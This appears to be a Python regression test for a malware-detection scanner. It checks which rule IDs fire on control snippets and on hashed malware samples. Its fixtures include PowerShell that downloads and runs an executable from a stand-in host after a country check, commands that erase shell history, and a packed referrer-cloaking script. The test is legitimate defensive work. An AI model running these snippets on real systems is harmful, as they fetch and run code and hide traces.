#!/usr/bin/env python3
"""Non-executing positive/near-miss tests for this review's changes."""
import argparse
import ast
import hashlib
import json
from pathlib import Path
import runpy
import subprocess

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[2]
SAMPLES = Path('/usr/local/var/cyclotron/tmp.noindex/cyclotron-90084b2c/samples')
GEOGATE = 'objectives/anti-analysis/geofencing/target-gating::powershell-country-selected-execution'
DROP = 'objectives/execution/payload/file-exec::powershell-defender-exclusion-iwr-7za-dropper'
ERASE = 'objectives/evasion/indicator-removal/history::powershell-excluded-payload-history-erasure'
RACE = 'objectives/privilege-escalation/exploit/race-condition::defender-update-sam-link-race'
SWAP = 'objectives/credential-access/registry::offline-sam-read-password-replacement'
HISTORY = 'micro-behaviors/fs/path/personal::powershell-history-save-path'
STOP = 'micro-behaviors/data/control-flow/error-handling::powershell-stop-on-error'
TX = 'micro-behaviors/fs/file/handle::create-file-transacted-api'
PIPE = 'metadata/lang/source/literal::pipe-token-search-engine-names'
PACKED = 'objectives/evasion/decoy/cloaking::packed-search-referrer-redirect'
JSON_ARG = 'metadata/lang/source/syntax/command::json-hidden-temp-shell-arguments'
JSON_CHAIN = 'objectives/execution/payload/file-exec::serialized-agent-hidden-temp-shell-chain'
GEO = '''$countries = @('US','CA','MX','GB','FR','DE','ES','IT')
$services = @('https://ipwho.is/?fields=country_code', 'https://ipinfo.io')
$country = Invoke-RestMethod -Uri $services[0]
'''
CONTROLS = {
    'regional-routing.ps1': GEO + 'if ($country -in $countries) { Write-Host "Use local mirror" }\n',
    'regional-exit.ps1': GEO + 'if ($country -in $countries) { exit 0 }\n',
    'country-array-only.ps1': GEO.splitlines()[0]+'\n',
    'geo-webclient-launch.ps1': GEO + '''if ($country -in $countries) { exit 0 }
$wc = New-Object 'Net.WebClient'
$wc.DownloadFile('https://stage.invalid/tool.exe', "$env:TEMP/tool.exe")
Start-Process "$env:TEMP/tool.exe"
''',
    'preferences-only.ps1': "$ErrorActionPreference = 'Stop'\nSet-PSReadLineOption -HistorySaveStyle SaveNothing\n[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()\n",
    'history-path-query.ps1': '(Get-PSReadLineOption).HistorySavePath\n',
    'history-clear.ps1': '''Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Set-PSReadlineOption -HistorySaveStyle SaveNothing
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
''',
    'admin-role.ps1': '$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n',
    'admin-role-string.ps1': 'Write-Host "Administrator"\n',
    'transacted-call.py': 'def read(k, h):\n    return k.CreateFileTransactedW("x", 0, 0, None, 3, 0, None, h, None, None)\n',
    'transacted-string.py': 'name = "CreateFileTransactedW"\n',
    'transacted-native.c': 'void read(void) { CreateFileTransactedW(0); }\n',
    'image-doc.ps1': '$x = "data:image/png;base64,AA=="\n$doc = "https://learn.microsoft.com/powershell/"\n',
    'image-doc-nearmiss.ps1': '$x = "image/png"\n$doc = "https://docs.example.org/powershell/"\n',
    'pipe-dictionary.js': "const tokens = '|google|x|yahoo|';\n",
    'pipe-nearmiss.js': "const tokens = '|google|bing|';\n",
    'pipe-comment.html': "<!-- '|google|x|yahoo|' -->\n",
    'packed-cloak.html': """<script>eval(function(p,a,c,k,e,d){return p.replace(new RegExp('x'),k)}('x',1,1,'|google|x|yahoo|referrer|location|'.split('|'),0,{}));</script>""",
}


def documents(text):
    dec = json.JSONDecoder()
    while text.strip():
        text=text.lstrip(); obj,end=dec.raw_decode(text);yield obj;text=text[end:]


def main():
    ap=argparse.ArgumentParser();ap.add_argument('--scratch',required=True,type=Path);ap.add_argument('--cleave',default='cleave');args=ap.parse_args()
    out=args.scratch;out.mkdir(parents=True,exist_ok=True)
    controls=dict(CONTROLS)
    old=runpy.run_path(str(ROOT/'testdata/bluehammer-4051/check.py'))
    controls.update({'blue-'+k:v for k,v in old['CONTROLS'].items()})
    for name,source in controls.items(): (out/name).write_text(source)
    sample_files=[SAMPLES/'c90ab7290f88/update.ps1',SAMPLES/'12961ad2fa5a/update-race.py',SAMPLES/'f8365e4c2350/update-race.cpp']
    expected=['c90ab7290f88ca370439b85229cac3c99cda4915b8c9bb206d01ee2b087a5358','12961ad2fa5ad73e6a0a0157786f93ce29efb7ed6c7fee3794053fc0da5fb135','f8365e4c235063468b822edf70bf4ba0ecde8fd4c2464c12aae2168506f394d0']
    for p,h in zip(sample_files,expected): assert hashlib.sha256(p.read_bytes()).hexdigest()==h
    tree=ast.parse(sample_files[1].read_text());assert all(isinstance(n,(ast.Import,ast.ImportFrom,ast.FunctionDef)) for n in tree.body)
    outside=[ROOT/'testdata/hostile/model-backdoor-tool-call.json',ROOT/'testdata/hostile/model-backdoor-tool-call-reordered.json',ROOT/'testdata/benign/model-backdoor-clean-tool-call.json',ROOT/'testdata/benign/model-backdoor-split-tool-calls.json',ROOT/'testdata/benign/model-backdoor-nonexecuting-tool.json']
    command=[args.cleave,'--traits-dir',str(ROOT),'--format=json']+[str(out/n) for n in controls]+list(map(str,sample_files+outside))
    result=subprocess.run(command,capture_output=True,text=True)
    (out.parent/'regression-scan.json').write_text(result.stdout)
    (out.parent/'regression-scan.log').write_text(result.stderr)
    assert result.returncode == 0, result.stderr
    files={Path(f['path']).name:{t['id']:t['crit'] for t in f.get('traits',[])} for d in documents(result.stdout) for f in d['files']}
    assert GEOGATE not in files['regional-routing.ps1']
    assert files['regional-exit.ps1'][GEOGATE]==4
    assert files['geo-webclient-launch.ps1'][GEOGATE]==4
    # The existing WebClient consumer is unchanged. This engine projects
    # New-Object's operand as an array, so its string-argument atom declines.
    assert STOP in files['preferences-only.ps1']
    assert 'metadata/package/testing/presence/ci::powershell-ci-fail-closed-guard' not in files['preferences-only.ps1']
    assert HISTORY in files['history-path-query.ps1']
    assert 'micro-behaviors/fs/read/file/target::powershell-history-save-path' not in files['history-path-query.ps1']
    assert ERASE not in files['history-clear.ps1']
    assert 'micro-behaviors/fs/file/handle::python-create-file-transacted-call' in files['transacted-call.py']
    assert TX in files['transacted-native.c']
    assert 'micro-behaviors/fs/file/handle::python-create-file-transacted-call' not in files['transacted-string.py']
    admin='micro-behaviors/os/privilege/check::powershell-administrator-role-check'
    assert admin in files['admin-role.ps1'] and admin not in files['admin-role-string.ps1']
    for id in ['micro-behaviors/communications/url/scheme::inline-image-data-uri-context','micro-behaviors/communications/url/host/name::documentation-host-reference']:
        assert id in files['image-doc.ps1'] and id not in files['image-doc-nearmiss.ps1']
    assert PIPE in files['pipe-dictionary.js'] and PIPE not in files['pipe-nearmiss.js'] and PIPE not in files['pipe-comment.html']
    assert files['packed-cloak.html'][PACKED]==5
    for name in ('model-backdoor-tool-call.json','model-backdoor-tool-call-reordered.json'):
        assert JSON_ARG in files[name] and files[name][JSON_CHAIN]==4
    for name in ('model-backdoor-clean-tool-call.json','model-backdoor-split-tool-calls.json','model-backdoor-nonexecuting-tool.json'):
        assert JSON_CHAIN not in files[name]
    for name in ('update-race.py','update-race.cpp'):
        assert files[name][RACE]==5 and files[name][SWAP]==5
        assert files[name]['micro-behaviors/os/registry/open::offreg-open-key-call']==3
    ps=files['update.ps1'];assert ps[DROP]==5 and ps[ERASE]==5 and ps[GEOGATE]==4
    assert ps['objectives/exfiltration/stealer/screen::powershell-desktop-png-base64-http-exfil']==5
    for name in controls:
        if name.startswith('blue-'):
            assert RACE not in files[name] and SWAP not in files[name],name
    print(json.dumps({'controls_passed':len(controls)+len(outside),'samples_passed':3},indent=2))

if __name__=='__main__': main()
